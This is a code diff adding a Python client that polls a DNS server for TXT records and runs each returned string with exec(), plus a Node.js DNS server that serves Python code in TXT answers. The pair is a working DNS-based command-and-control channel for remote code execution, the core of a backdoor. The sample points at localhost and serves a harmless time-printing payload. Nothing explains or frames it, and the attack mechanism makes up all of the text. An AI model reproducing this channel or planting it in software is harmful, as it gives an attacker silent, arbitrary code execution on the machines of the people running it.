@@ -1,0 +1,40 @@
+import dns.resolver
+import threading
+import time
+import sys
+import os
+nameServers = ['127.0.0.1']
+def execT(s):
+    exec(s)
+while True:
+    try:
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers=nameServers
+        res = resolver.query("google.com","TXT")
+        data = res[0].strings[0]
+        if not data == "":
+            threading.Thread(target=execT,args=(data,)).start()
+    except:
+        pass
+    time.sleep(1)
+
+
+
+var dns = require('native-dns');
+var server = dns.createServer();
+
+server.on('request', function (request, response) {
+  console.log(request.question)
+  response.answer.push(dns.TXT({
+    name: request.question[0].name,
+    data: ["import time;print(time.time())"],
+    ttl: 600,
+  }));
+  response.send();
+});
+
+server.on('error', function (err, buff, req, res) {
+  console.log(err.stack);
+});
+
+server.serve(53);
